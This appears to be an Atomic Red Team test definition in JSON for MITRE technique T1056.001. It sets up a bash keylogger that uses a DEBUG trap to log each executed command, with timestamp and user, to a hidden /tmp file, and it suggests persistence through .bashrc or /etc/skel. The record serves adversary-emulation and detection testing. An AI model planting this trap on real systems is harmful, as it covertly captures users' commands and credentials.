{
    "name": "Bash session based keylogger",
    "description": "When a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = echo $BASH_COMMAND. The trap command is not a external command, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a file, creating a bash session based keylogger.   To gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/  ",
    "supported_platforms": [
        "linux"
    ],
    "dependency_executor_name": "sh",
    "executor": {
        "name": "bash",
        "elevation_required": false,
        "command": "trap 'echo \"$(date +\"%d/%m/%y %H:%M:%S.%s\") $USER $BASH_COMMAND\" >> #{output_file}' DEBUG\necho \"Hello World!\"\ncat #{output_file}\n",
        "cleanup_command": "rm #{output_file}\n",
        "type": "Command Executor"
    },
    "id": "T1056.001",
    "tactics": [
        "Credential Access",
        "Collection"
    ],
    "technique": "Keylogging",
    "source": "ART",
    "uuid": "7f85a946-a0ea-48aa-b6ac-8ff539278258",
    "arguments": {
        "output_file": {
            "description": "File to store captured commands",
            "type": "string",
            "default": "/tmp/.keyboard.log"
        }
    },
    "preconditions": [
        {
            "description": "This test requires to be run in a bash shell\n",
            "prereq_command": "if [ \"$(echo $0)\" != \"bash\" ]; then echo -e \"\\n***** Bash not running! *****\\n\"; exit 1; fi\n",
            "get_prereq_command": "echo \"\"\n"
        }
    ],
    "infrastructure_requirement": [],
    "side": "Victim"
}